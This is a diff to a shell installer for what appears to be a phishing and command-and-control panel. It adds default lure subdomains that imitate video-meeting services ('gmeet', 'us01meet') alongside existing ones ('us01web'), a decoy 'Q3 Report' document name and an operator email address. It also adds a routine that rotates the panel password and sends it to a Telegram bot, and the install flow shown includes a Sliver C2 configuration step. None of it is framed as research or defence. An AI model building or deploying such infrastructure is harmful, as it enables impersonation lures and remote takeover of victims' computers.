@@ -129,6 +129,7 @@ setup_env() {
       emit OPERATOR_EMAIL "${OPERATOR_EMAIL:-fingod201@gmail.com}"
       emit DOCUMENT_NAME "${DOCUMENT_NAME:-Q3 Report}"
       emit PANEL_LURE_HOSTS "${PANEL_LURE_HOSTS:-get,us01web,us02web,us03web,us04web,us05web}"
+      emit PANEL_MEET_HOSTS "${PANEL_MEET_HOSTS:-meet,gmeet,us01meet,us02meet}"
       emit TG_BOT_TOKEN "${TG_BOT_TOKEN:-}"
       emit TG_CHAT_ID "${TG_CHAT_ID:-}"
       emit CF_API_TOKEN "${CF_API_TOKEN:-}"
@@ -272,12 +273,49 @@ run_check() {
   fi
 }
 
+show_creds() {
+  local user pass
+  load_env
+  user="${PANEL_USER:-operator}"
+  printf '\n+====================================================+\n'
+  printf '|  PANEL.telcom.stream  username: %-18s |\n' "$user"
+  printf '|  PANEL PASSWORD (from first install): %-12s |\n' "(hashed only)"
+  printf '+====================================================+\n\n'
+  run_check || true
+}
+
+rotate_password() {
+  load_env
+  local pass hash
+  pass="$(python3 -c 'import base64,os;print(base64.urlsafe_b64encode(os.urandom(18)).decode().rstrip("="))')"
+  hash="$(printf '%s' "$pass" | "$VENV/bin/python" -c 'import bcrypt,sys;print(bcrypt.hashpw(sys.stdin.read().encode(),bcrypt.gensalt(12)).decode())' 2>/dev/null || true)"
+  if [ -z "$hash" ]; then
+    python3 -m venv "$VENV"; "$VENV/bin/pip" install -q bcrypt
+    hash="$(printf '%s' "$pass" | "$VENV/bin/python" -c 'import bcrypt,sys;print(bcrypt.hashpw(sys.stdin.read().encode(),bcrypt.gensalt(12)).decode())')"
+  fi
+  upsert_env PANEL_PASS_HASH "$hash"
+  systemctl restart fleet-panel >/dev/null 2>&1 || true
+  printf '\n+======================================================+\n'
+  printf '|  username: %-24s              |\n' "${PANEL_USER:-operator}"
+  printf '|  password: %-24s              |\n' "$pass"
+  printf '+======================================================+\n\n'
+  if [ -n "${TG_BOT_TOKEN:-}" ] && [ -n "${TG_CHAT_ID:-}" ]; then
+    curl -s -o /dev/null -X POST "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" \
+      --data-urlencode "chat_id=${TG_CHAT_ID}" --data-urlencode "parse_mode=HTML" \
+      --data-urlencode "text=<b>fleet panel rotated</b> ${PANEL_USER:-operator} / <code>${pass}</code>" || true
+  fi
+}
+
 main() {
   need_root
   if [ "${1:-}" = "--check" ]; then
     run_check
     log "failures: $FAILURES"
     [ "$FAILURES" -eq 0 ]
+    return
+  fi
+  if [ "${1:-}" = "--password" ] || [ "${1:-}" = "--rotate-password" ]; then
+    rotate_password
     return
   fi
   install_packages
@@ -287,6 +325,7 @@ main() {
   load_env
   upsert_env PANEL_PUBLIC_HOST "$(domain_name)"
   upsert_env PANEL_LURE_HOSTS "${PANEL_LURE_HOSTS:-get,us01web,us02web,us03web,us04web,us05web}"
+  upsert_env PANEL_MEET_HOSTS "${PANEL_MEET_HOSTS:-meet,gmeet,us01meet,us02meet}"
   build_all
   make_sliver_cfg
   install_units
